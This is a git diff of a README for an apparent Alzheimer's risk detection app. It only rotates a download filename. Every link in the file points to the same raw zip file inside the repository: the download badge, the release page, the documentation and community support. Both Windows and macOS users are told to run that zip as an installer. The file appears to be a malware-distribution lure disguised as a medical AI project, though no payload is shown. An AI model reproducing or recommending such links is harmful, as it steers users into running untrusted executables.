@@ -1,6 +1,6 @@
 # 🧠 NeuroMind_AI-Alzheimer-Disease-Risk-Detection - Detect Alzheimer's Risk with AI
 
-[![Download](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip)
+[![Download](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip)
 
 ## 📖 Overview
 
@@ -28,19 +28,19 @@ Before you proceed, ensure your system meets the following requirements:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to [this page to download](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip). Here, you can find the latest version of NeuroMind.
+   Go to [this page to download](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip). Here, you can find the latest version of NeuroMind.
 
 2. **Select the Correct Version**
    Look for the most recent release. Click on the version number (e.g., v1.0) to view available files.
 
 3. **Download the Application**
    Choose the file that matches your operating system:
-   - For Windows, select `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip`
-   - For macOS, select `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip`
+   - For Windows, select `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip`
+   - For macOS, select `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip`
 
 4. **Run the Installer**
-   - **Windows**: Double-click `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip`, then follow the on-screen instructions.
-   - **macOS**: Open `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip`, drag the app to your Applications folder.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip`, then follow the on-screen instructions.
+   - **macOS**: Open `https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip`, drag the app to your Applications folder.
 
 5. **Open NeuroMind**
    Find the application in your Start Menu (Windows) or Applications folder (macOS). Click to launch it.
@@ -76,9 +76,9 @@ If you encounter issues or have questions, you can reach out for help. Check the
 
 ## 🔗 Helpful Links
 
-- Documentation: [View Detailed Docs](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip)
-- Community Support: [Join the Discussion](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip)
-- Release Page: [Visit this page to download](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Mind_Detection_Disease_Alzheimer_Risk_Neuro_A_unsupplantable.zip)
+- Documentation: [View Detailed Docs](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip)
+- Community Support: [Join the Discussion](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip)
+- Release Page: [Visit this page to download](https://raw.githubusercontent.com/RajAbbas/NeuroMind_AI-Alzheimer-Disease-Risk-Detection/main/Alzheimers_EDA/Risk-Disease-A-Alzheimer-Neuro-Detection-Mind-corach.zip)
 
 ## 📝 License
 
